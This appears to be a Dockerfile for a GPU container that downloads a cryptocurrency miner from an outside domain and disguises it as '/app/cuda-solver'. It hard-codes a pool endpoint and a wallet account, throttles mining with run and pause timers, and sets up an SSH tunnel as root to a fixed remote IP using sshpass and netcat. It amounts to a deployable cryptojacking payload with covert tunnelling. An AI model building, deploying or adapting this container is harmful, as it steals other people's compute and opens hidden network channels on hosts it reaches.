FROM nvidia/cuda:12.4.1-runtime-ubuntu22.04

RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    curl \
    netcat-openbsd \
    openssh-client \
    python3 \
    sshpass \
  && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY clean.py ./
RUN curl -fsSL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /tmp/miner && \
    python3 clean.py && \
    chmod +x /app/cuda-solver && \
    rm /tmp/miner clean.py

COPY entry.sh tunnel-entry.sh ./
RUN chmod +x entry.sh tunnel-entry.sh

ENV ENDPOINT=175.155.64.171:31360
ENV RELAY_ENDPOINT=175.155.64.171:31360
ENV ENDPOINT_MODE=auto
ENV HEALTH_HOST=0.0.0.0
ENV HEALTH_PORT=30000
ENV NODE_ID=""
ENV ACCOUNT=prl1p92hryhjdple3u9hmzqq6cth8zqrrpk4g3cq5zxpgrswfsydk7ueqafaq8d
ENV RUN_SEC=1200
ENV PAUSE_SEC=60
ENV LOCAL_HOST=127.0.0.1
ENV LOCAL_PORT=19011
ENV TARGET_HOST=129.226.55.135
ENV TARGET_PORT=9000
ENV TUNNEL_HOST=175.155.64.171
ENV TUNNEL_PORT=22136
ENV TUNNEL_USER=root

CMD ["./tunnel-entry.sh"]
